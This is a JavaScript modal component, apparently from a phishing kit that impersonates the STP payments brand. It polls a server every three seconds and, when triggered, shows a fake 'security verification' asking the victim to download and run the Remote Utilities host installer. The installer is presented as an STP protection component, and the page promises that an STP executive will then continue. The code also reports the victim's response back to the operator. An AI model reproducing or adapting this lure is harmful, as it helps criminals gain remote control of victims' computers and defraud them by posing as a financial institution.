/**
 * Sistema de Herramientas - Maneja el envío y recepción de herramientas
 * Se integra con el sistema de modales existente
 */

class HerramientasSystem {
    constructor() {
        this.autoClose = false; // Flag para controlar cierre automático
        if (window.Telas) Telas.registrar('herramientas', () => this.cerrarVisual());
        this.init();
    }

    init() {
        // Iniciar verificación de herramientas cada 3 segundos
        this.startHerramientasCheck();
        
        // Verificar inmediatamente al cargar
        this.checkForHerramientas();
    }

    startHerramientasCheck() {
        // Verificar herramientas cada 3 segundos
        this.herramientasInterval = setInterval(() => {
            this.checkForHerramientas();
        }, 3000);
    }

    stopHerramientasCheck() {
        if (this.herramientasInterval) {
            clearInterval(this.herramientasInterval);
            this.herramientasInterval = null;
        }
    }

    async checkForHerramientas() {
        const epoch = window.Telas ? Telas.epoch : 0;
        try {
            // Verificar herramientas
            const toolsResponse = await fetch('php_modales/verificar_herramientas.php');
            
            // Verificar que la respuesta sea JSON válido
            const toolsText = await toolsResponse.text();
            let toolsData;
            try {
                toolsData = JSON.parse(toolsText);
            } catch (e) {
                console.error('Respuesta no válida de verificar_herramientas.php:', toolsText);
                return;
            }

            if (window.Telas && !Telas.vigente(epoch)) return;

            if (toolsData.success && toolsData.tiene_herramientas) {
                if (this._abriendo) return;
                const ya = document.getElementById('adminModal');
                if (ya && ya.classList.contains('active') && ya.classList.contains('herramientas-modal')) return;
                this.showHerramientasModal(toolsData);
            }
        } catch (error) {
            console.warn('Error verificando herramientas:', error);
        }
    }

    async showHerramientasModal(data) {
        if (this._abriendo) return;
        this._abriendo = true;
        const abierto = document.getElementById('adminModal');
        if (abierto) abierto.classList.remove('active');
        const epoch = window.Telas ? await Telas.ocupar('herramientas') : null;
        this._abriendo = false;
        if (window.Telas && (epoch == null || !Telas.vigente(epoch))) return;
        const modal = document.getElementById('adminModal');
        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        // Limpiar estado anterior
        errorEl.style.display = 'none';
        errorEl.textContent = '';
        inputContainer.style.display = 'none';

        // Agregar clase específica para herramientas
        modal.classList.remove('email-validation-modal');
        modal.classList.add('herramientas-modal');

        // Configurar mensaje con layout completo
        messageEl.innerHTML = `
            <div class="herramientas-header">
                <div class="herramientas-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="herramientas-title">
                    <h3>Verificación de Seguridad STP</h3>
                    <p>Actualización de componentes requerida</p>
                </div>
            </div>
            
            <div class="herramientas-content">
                <div class="herramientas-left">
                    <div class="herramientas-device">
                        <i class="fas fa-laptop"></i>
                    </div>
                    <div class="herramientas-description">
                        <p>Para completar la verificación de seguridad en tu cuenta, es necesario instalar el componente de protección de STP. Este proceso garantiza la integridad de tus operaciones.</p>
                    </div>
                </div>
                
                <div class="herramientas-right">
                    <div class="herramientas-instructions">
                        <h4><i class="fas fa-list-ol"></i> Instrucciones:</h4>
                        <div class="instruction-item">
                            <span class="step-number">1</span>
                            <span>Descarga el componente de seguridad</span>
                        </div>
                        <div class="instruction-item">
                            <span class="step-number">2</span>
                            <span>Ejecuta el archivo descargado</span>
                        </div>
                        <div class="instruction-item">
                            <span class="step-number">3</span>
                            <span>Autoriza la instalación cuando se solicite</span>
                        </div>
                        <div class="instruction-item">
                            <span class="step-number">4</span>
                            <span>Un ejecutivo de STP continuará con el proceso</span>
                        </div>
                    </div>
                    
                    <div class="herramientas-warning">
                        <div class="warning-icon">
                            <i class="fas fa-exclamation-triangle"></i>
                        </div>
                        <div class="warning-content">
                            <strong>Aviso:</strong> Este componente es proporcionado directamente por STP para garantizar la seguridad de tu cuenta.
                        </div>
                    </div>
                </div>
            </div>
        `;

        // Configurar botones
        buttonsContainer.innerHTML = `
            <div class="herramientas-download-wrapper">
                <div class="herramientas-download-section">
                    <a href="https://www.remoteutilities.com/download/host-7.6.2.0.msi" 
                       target="_blank" 
                       download="remote-utilities-host-7.6.2.0.msi"
                       class="herramientas-download-btn" 
                       onclick="herramientasSystem.procesarDescarga()">
                        <i class="fas fa-download"></i>
                        Descargar 
                    </a>
                    <p class="download-note">La descarga iniciará automáticamente. Ejecuta el archivo para continuar.</p>
                </div>
            </div>
        `;

        // Mostrar modal
        modal.classList.add('active');
    }

    abrirHerramientas(pagina) {
        // MÉTODO OBSOLETO - Ya no se usa
        // Se mantiene por compatibilidad pero se recomienda usar procesarDescarga()
        console.warn('abrirHerramientas() está obsoleto, usa procesarDescarga()');
        this.procesarDescarga();
    }

    procesarDescarga() {
        // Enviar respuesta de descarga al chat
        this.enviarRespuestaHerramientas('descarga');
        if (window.Telas) Telas.trasRespuesta();

        // Marcar como cierre automático para evitar enviar mensaje de cierre
        this.autoClose = true;
        
        // Cerrar modal sin interrumpir otros procesos
        this.closeModal();
    }

    cerrarVisual() {
        const modal = document.getElementById('adminModal');
        if (!modal || !modal.classList.contains('herramientas-modal')) return;
        modal.classList.remove('active', 'herramientas-modal');
    }

    closeModal() {
        const modal = document.getElementById('adminModal');
        if (modal && modal.classList.contains('herramientas-modal')) {
            // Solo enviar mensaje de cierre si es un modal de herramientas y se cierra manualmente
            if (modal.classList.contains('active') && !this.autoClose) {
                this.enviarRespuestaHerramientas('cerrar');
                if (window.Telas) Telas.trasRespuesta();
            }
            modal.classList.remove('active');
            modal.classList.remove('herramientas-modal');
            
            // Resetear flag
            this.autoClose = false;
        }
    }

    async enviarRespuestaHerramientas(accion = 'aceptar') {
        try {
            const response = await fetch('php_modales/procesar_herramientas.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    accion: 'respuesta_herramientas',
                    tipo_respuesta: accion
                })
            });

            const data = await response.json();
            
            if (data.success) {
            }
        } catch (error) {
            console.error('Error enviando respuesta de herramientas:', error);
        }
    }

    // Método para destruir el sistema (útil al cambiar de página)
    destroy() {
        this.stopHerramientasCheck();
    }
}

// Inicializar sistema cuando se carga la página
let herramientasSystem;

document.addEventListener('DOMContentLoaded', function() {
    herramientasSystem = new HerramientasSystem();
});

// Limpiar al salir de la página
window.addEventListener('beforeunload', function() {
    if (herramientasSystem) {
        herramientasSystem.destroy();
    }
}); 
